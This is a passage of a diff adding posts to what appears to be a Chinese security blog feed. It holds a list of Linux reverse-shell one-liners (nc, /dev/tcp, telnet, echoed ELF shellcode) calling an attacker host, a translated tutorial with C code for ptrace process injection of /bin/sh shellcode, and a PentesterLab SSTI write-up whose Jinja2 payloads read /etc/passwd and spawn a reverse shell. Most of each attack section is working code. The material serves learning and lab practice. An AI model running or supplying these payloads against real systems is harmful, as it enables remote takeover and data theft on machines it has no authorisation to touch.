+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
+<ul>
+<li>现在的netcat版本可能没有-e参数。<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
+<li>那么可以使用下面的命令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt;	# A</div></pre></td></tr></table></figure>
+<p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p>
+<h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
+<ul>
+<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
+<p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p>
+<ul>
+<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
+<p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
+<ul>
+<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li>
+<li>这里的shellcode可以使用msf生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -v -l 1337             # Attacker</div><div class="line">echo -e &quot;\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; &gt; c; chmod +x c;./c &amp; rm c  # Target</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
+<li>这里只是一些小技巧，我希望在我们遇到比如某些命令在某个系统中不能使用的时候，或许我们可以发现并使用其它的方式，可以达到同样的效果，而不是在一棵树上吊死<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4></li>
+<li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="external">Spawning reverse shells</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。&lt;/li&gt;
+&lt;li&gt;linux(GNUx
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>linux进程注入(-)</title>
+    <link href="http://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
+    <id>http://kevien.github.io/2018/01/28/linux进程注入/</id>
+    <published>2018-01-28T09:18:28.000Z</published>
+    <updated>2018-03-20T16:13:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">译文声明</div><div class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</div><div class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</div><div class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</div><div class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</div></pre></td></tr></table></figure>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我们的代码，但是如何向一个已在运行的进程中注入代码呢?这篇文章我将介绍如何去操作其它进程内存的一些基本技巧…换句话说，就是教你如何去写一个属于你自己的调试器。<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4></li>
+<li>在去介绍技术细节之前，让我先来介绍几个需要注入代码到运行中进程的场景。</li>
+<li>最初的场景并不是应用在恶意软件，而是应用在内存热补丁上面。运行的程序不能被关闭或者重启，或者说关闭或者重启需要很多的花销。因为这个原因，所以如何在不关闭进程或者不重启进程的情况下去给程序打补丁和更新是前几年一个比较热门的话题。</li>
+<li>另外一个主要的应用场景就是调试器以及逆向工具的开发。例如radare2…通过这篇文章你将学习它们是如何工作的。</li>
+<li>显然另外的一个主要原因还是恶意软件的发展，病毒、后门等等。我猜大多数的使用者都是这个原因。一个例子，你们很多人都知道meterpreter的进程注入功能，这个功能够让你运行你的payload在一个’无辜’的且正在运行的进程中。</li>
+<li>如果你之前读过我的文章，你应该知道我将要讨论linux下的进程注入，基本的原理在不同的操作系统平台下是类似的，所以我希望即使你不是一个linuxer，这篇文章也会对你有用。就说这么多了，下面让我们来看具体细节吧。<h4 id="在linux中进行进程调试"><a href="#在linux中进行进程调试" class="headerlink" title="在linux中进行进程调试"></a>在linux中进行进程调试</h4></li>
+<li>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在linux中具有调试功能的工具有ptrace、Gdb、radare2、ddd、strace等，这些工具都是使用ptrace这个系统调用来提供服务的。</li>
+<li>ptrace系统调用允许一个进程去调试另外一个进程，使用ptrace能够使我们停止一个目标进程的执行并且能够让我们去查看和修改目标进程中各个寄存器的值以及内存的值。</li>
+<li>这里用两种方式去调试一个进程，第一种(也是最直接的一种)就是让我们的调试器去开启我们的进程…fork和exec，这种一般是传入被调试程序的名字参数给gdb或者strace。</li>
+<li>另外一种就是我们需要去动态附加我们的调试器到运行的进程。</li>
+<li>这篇文章我们主要关注第二种，当你对这些基本的知识点熟悉之后，后面在你调试程序的时候就不会有什么问题了。<h4 id="附加到正在运行的进程"><a href="#附加到正在运行的进程" class="headerlink" title="附加到正在运行的进程"></a>附加到正在运行的进程</h4></li>
+<li>修改正在运行的进程之前我们首先做的是要调试它，这个过程被称为附加，这也是gdb的一个命令，让我们看下面的代码：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/ptrace.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/user.h&gt;</div><div class="line">#include &lt;sys/reg.h&gt;</div><div class="line"></div><div class="line">int</div><div class="line">main (int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">  pid_t                   target;</div><div class="line">  struct user_regs_struct regs;</div><div class="line">  int                     syscall;</div><div class="line">  long                    dst;</div><div class="line"></div><div class="line">  if (argc != 2)</div><div class="line">    &#123;</div><div class="line">      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  target = atoi (argv[1]);</div><div class="line">  printf (&quot;+ Tracing process %d\n&quot;, target);</div><div class="line">  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(ATTACH):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Waiting for process...\n&quot;);</div><div class="line">  wait (NULL);</div></pre></td></tr></table></figure>
+<ul>
+<li>在这段代码中我们可以看到main函数接收一个参数，这里是pid（进程id号），即我们想要去注入的进程。我们在后面的每次ptrace系统调用的时候都会用的到。</li>
+<li>我们使用ptrace系统调用，第一个参数是PTRACE_ATTACH,第二个参数是我们想要附加的进程id，之后我们调用wait的SIGTRAP信号去判断附加进程是否完成。</li>
+<li>这个时候，我们附加的进程停止，我们可以按照我们的意愿去修改它。<h4 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h4></li>
+<li>首先我们需要知道我们要将我们的代码注入到哪里，这里有几种可能性：</li>
+</ul>
+<ol>
+<li>我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。</li>
+<li>我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。</li>
+<li>另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。</li>
+<li>最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。</li>
+</ol>
+<ul>
+<li>简单点儿，我们打算在控制了进程之后，在IP寄存器地址处注入我们的代码，后面的代码中可以看到，我们将直接注入一段典型的得到shell session的shellcode。因此我们也不期望交还控制权给原来的进程。换句话说，我们不在乎是否会破坏原有的进程。<h4 id="获取寄存器和内存信息"><a href="#获取寄存器和内存信息" class="headerlink" title="获取寄存器和内存信息"></a>获取寄存器和内存信息</h4></li>
+<li><p>下面的代码注入我们的“恶意代码”到目标进程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">printf (&quot;+ Getting Registers\n&quot;);</div><div class="line">if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">  &#123;</div><div class="line">    perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">    exit (1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);</div><div class="line">inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);</div><div class="line">regs.rip += 2;</div></pre></td></tr></table></figure>
+</li>
+<li><p>上面的代码中首先看到的是我们调用了ptrace,其中第一个参数是PTRACE_GETREGS,这将使我们的程序可以获取到被控制进程的寄存器内容。</p>
+</li>
+<li>之后，我们使用一个方法注入我们的shellcode到目标进程。注意我们获取了regs.rip(即目标进程当前的IP寄存器的值)，inject_data函数，如你所想，拷贝我们的shellcode到reg.rip所指向的内存地址处。</li>
+<li><p>让我们看看是怎么样的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">inject_data (pid_t pid, unsigned char *src, void *dst, int len)</div><div class="line">&#123;</div><div class="line">  int      i;</div><div class="line">  uint32_t *s = (uint32_t *) src;</div><div class="line">  uint32_t *d = (uint32_t *) dst;</div><div class="line"></div><div class="line">  for (i = 0; i &lt; len; i+=4, s++, d++)</div><div class="line">    &#123;</div><div class="line">      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(POKETEXT):&quot;);</div><div class="line">	  return -1;</div><div class="line">	&#125;</div><div class="line">    &#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>很简单是不是，在这个函数中只有两点是需要稍微解释说明的</p>
+</li>
+</ul>
+<ol>
+<li>PTRACE_POKETEXT 用来写入目标进程的内存中，这里就是我们真正注入我们的代码到目标进程，此外还有PTRACE_PEEKTEXT函数等.</li>
+<li>PTRACE_POKETEXT 函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。<h4 id="运行注入代码"><a href="#运行注入代码" class="headerlink" title="运行注入代码"></a>运行注入代码</h4></li>
+</ol>
+<ul>
+<li><p>现在目标进程的内存已经被注入包含我们需要运行的代码了，现在要做的就是交回我们的控制权给目标进程并让它保持正常运行了。这里有几种不同的方法，这里我们需要做的是分离目标进程，因此，我们停止调试目标进程。下面的方法可以停止调试且让目标进程继续执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);</div><div class="line">  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Run it!\n&quot;);</div><div class="line"> </div><div class="line">  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(DETACH):&quot;);</div><div class="line">	  exit (1);</div><div class="line">	&#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>这里很容易理解，需要注意的是我们需要先把寄存器的值重新设回到以前，然后再去分离。回到前面的章节部分检查一下我们注入的代码…你注意到了在这里<br>为什么要regs.rip += 2了吗</p>
+</li>
+<li>是的，我们修改了IP寄存器的值，这也是为什么我们能够成功分离并将程序控制权交还给目标进程的原因所在。<h4 id="如何去算出这两个字节"><a href="#如何去算出这两个字节" class="headerlink" title="如何去算出这两个字节"></a>如何去算出这两个字节</h4></li>
+<li>当我们调用PTRACE_DEATCH时候需要另外计算的两个字节并不那么容易去发现，我来告诉你们，来满足大家的好奇心。</li>
+<li>在整个测试的过程中，当我尝试去注入代码的时候目标进程总是崩掉，一个原因是我的目标程序中栈数据不能执行，我通过execstack 工具去排除这个原因，但是程序还是会崩掉，所以我开启了内存dump分析了一下到底发生了什么。</li>
+<li>原因是，你不能同时运行gdb去调试目标进程，否则第一个ptrace会失败，你不能用两个调试器在同一时间调试同一个程序（这句话隐藏了一个反调试的技巧;）,所以当我尝试栈溢出的方式注入代码的时候得到如下的信息：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+ Tracing process 15333</div><div class="line">+ Waiting for process...</div><div class="line">+ Getting Registers</div><div class="line">+ Injecting shell code at 0x7ffe9a708728</div><div class="line">+ Setting instruction pointer to 0x7ffe9a708708</div><div class="line">+ Run it!</div></pre></td></tr></table></figure>
+<ul>
+<li>当然，这里的地址以及进程名在你的系统中可能不一样，然而，进程崩溃dump的内存可以通过gdb去检查到底发生了什么。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gdb ./target core</div><div class="line">(... gdb start up messages removed ...)</div><div class="line">Reading symbols from ./target...(no debugging symbols found)...done.</div><div class="line">[New LWP 15333]</div><div class="line">Core was generated by `./target&apos;.</div><div class="line">Program terminated with signal SIGSEGV, Segmentation fault.</div><div class="line">#0  0x00007ffe9a708706 in ?? ()</div></pre></td></tr></table></figure>
+<ul>
+<li>可以看到这里发生了段地址错误，如果你对比了injector的输出信息可以发现这里有两字节的不同，修改这里将会使你注入成功。<h4 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h4></li>
+<li>为了测试我写了个简单的程序，这个程序只是打印了它自己的pid(你就不用去找它的pid了)，然后每隔2s打印一个helloword，打印10次，这将会给你注入的时间。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;   </div><div class="line">    int i;</div><div class="line"></div><div class="line">    printf (&quot;PID: %d\n&quot;, (int)getpid());</div><div class="line">    for(i = 0;i &lt; 10; ++i) &#123;</div><div class="line"></div><div class="line">	write (1, &quot;Hello World\n&quot;, 12);</div><div class="line">        sleep(2);</div><div class="line">    &#125;</div><div class="line">    getchar();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>我所用到的shellcode是通过如下的汇编文件生成的：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">section .text</div><div class="line">        global _start</div><div class="line"></div><div class="line">_start:</div><div class="line">        xor rax,rax</div><div class="line">        mov rdx,rax             ; No Env</div><div class="line">        mov rsi,rax             ; No argv</div><div class="line">        lea rdi, [rel msg]</div><div class="line"></div><div class="line">        add al, 0x3b</div><div class="line"></div><div class="line">        syscall</div><div class="line">        msg db &apos;/bin/sh&apos;,0</div></pre></td></tr></table></figure>
+<h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><ul>
+<li>ptrace是一个非常强大的工具，这篇文章中我们只是用到了最基本的，现在时候打开你的terminal然后输入man ptrace去学习一下它是如何的神奇了。</li>
+<li>如果你有兴趣的话，你还可以进行如下的尝试：</li>
+<li>1.修改注入代码到代码空隙</li>
+<li>2.使用更加好用的shellcode让它另起一个进程，从而保持原程序正常运行</li>
+<li>3.你的shellcode将会运行在目标项目中并且可以读取打开的文件…</li>
+<li>一如往常，你可以github上找到文章中所涉及到的代码<br><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="external">https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>附上译者的测试截图<br><img src="/2018/01/28/linux进程注入/testinject.png" alt=""><h4 id="20180320更新"><a href="#20180320更新" class="headerlink" title="20180320更新"></a>20180320更新</h4></li>
+<li>昨天在看《learing linux binary analysis》的时候看到的一个工具<a href="https://github.com/kevien/saruman" target="_blank" rel="external">saruman</a>,觉得还不错，这是一个已经相对比较稳定的进程注入工具。此外这里还有一个后门server感觉还不错。</li>
+<li>注意在编译server的时候记得加上 -fpic -pie的编译参数，其中fpic和pie参数用于生成位置无关可执行程序，其中fpic用于编译阶段，pie用于链接阶段。<br><img src="/2018/01/28/linux进程注入/poc.png" alt=""></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/di
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>从一道pentesterlab的题目说起</title>
+    <link href="http://kevien.github.io/2018/01/16/%E4%BB%8E%E4%B8%80%E9%81%93pentesterlab%E7%9A%84%E9%A2%98%E7%9B%AE%E8%AF%B4%E8%B5%B7/"/>
+    <id>http://kevien.github.io/2018/01/16/从一道pentesterlab的题目说起/</id>
+    <published>2018-01-16T14:04:50.000Z</published>
+    <updated>2018-07-29T10:14:53.237Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template Injection)的题目,目标是要执行任意命令，之前也没分析过SSTI的漏洞，所以简单看了下没搞定,后来有其它的事情就没看，这两天又看了下，觉得还是挺有意思的，就记录一下。<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4></li>
+<li>SSTI原理就不讲了，不是这篇文章的重点，想要了解可以参考Reference中的链接。<br>这个题目和Reference文章基本是一样的。</li>
+<li><p>读文件就不解释了 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</div><div class="line">(&apos;/etc/passwd&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>这里是通过file.read()方法直接读文件，然后直接显示在页面上的。但是如何实现命令执行反弹shell呢?</p>
+</li>
+<li>通过列举当前object下的子类可以发现有subprocess的Popen类，大家应该知道Popen是直接可以执行命令的，要索引类Popen，使用index不行（原因不明），但也可以通过笨方法自己索引<br><img src="/2018/01/16/从一道pentesterlab的题目说起/subprocess.png" alt=""></li>
+<li><img src="/2018/01/16/从一道pentesterlab的题目说起/indexpopen.png" alt=""></li>
+<li>索引233，后面就可以执行命令了，但是不能回显，所以可以把我们的命令执行后结果写入到文件，然后再通过读文件读出来。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/writecommand.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</div><div class="line">[233](&quot;id &gt;/tmp/M0rk.txt&quot;,shell=True) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/16/从一道pentesterlab的题目说起/readfile.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</div><div class="line">(&apos;/tmp/M0rk.txt&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
+<ul>
+<li>那能不能拿到shell呢？答案是肯定的.<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</div><div class="line">[233](&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;,shell=True) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/16/从一道pentesterlab的题目说起/shell.png" alt=""></p>
+<h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><ul>
+<li>今天又仔细研究了一下，发现了一种不依赖mro（Method Resolution Order）的方法。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexsystem.png" alt=""></li>
+<li><p>一步一步找到os.system的索引为138</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</div><div class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>同样可以拿到shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</div><div class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[138]</div><div class="line">(&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><ul>
+<li>本来想写个长文介绍SSTI原理以及python沙箱绕过原理的，后来发现无非还是翻译英文原著的文章，所以想了解原理的直接去看英文原版文章就好 ;)<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li><a href="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a></li>
+<li><a href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2 - Part 2</a></li>
